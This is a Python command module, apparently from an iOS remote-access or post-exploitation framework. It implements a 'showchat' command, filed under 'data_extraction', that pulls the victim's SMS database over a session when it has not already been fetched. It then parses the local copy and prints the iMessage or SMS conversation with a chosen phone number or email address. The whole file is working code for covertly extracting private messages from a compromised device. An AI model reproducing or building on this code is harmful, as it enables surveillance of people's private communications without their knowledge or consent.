import modules.dbfileparser, modules.helper, modules.dataformat, os, modules.commands.iOS.getsms_ios

class command:
    def __init__(self):
        self.name = "showchat"
        self.description = "Print the contents of a iMessage/SMS conversation"
        self.usage = "Usage: showchat <imsg/sms> <phonenumber/email (include country suffix)>"
        self.category = "data_extraction"

    def run(self, session, cmd_data):
        if len(cmd_data['args'].split(" ")) < 2:
            print(self.usage)
            return
        chat_type    = cmd_data["args"].split(" ")[0]
        chat_partner = cmd_data["args"].split(" ")[1]

        if session.sms_fetched == False:
            modules.helper.info_general("Dumping {type} conversation with {partner}".format(
                type = ("iMessage" if chat_type == "imsg" else "SMS"),
                partner = chat_partner))
            modules.commands.iOS.getsms_ios.command.run(self, session, cmd_data)
        chat_convo_extracted = modules.dbfileparser.parse_chat_convo("downloads/sms.db", chat_partner, (True if chat_type == "imsg" else False))
        if chat_convo_extracted["success"] == True:
            modules.dataformat.print_formatted_convo(chat_convo_extracted)
            return
        modules.helper.info_error("Extracing the conversation failed (file/conversation not found)")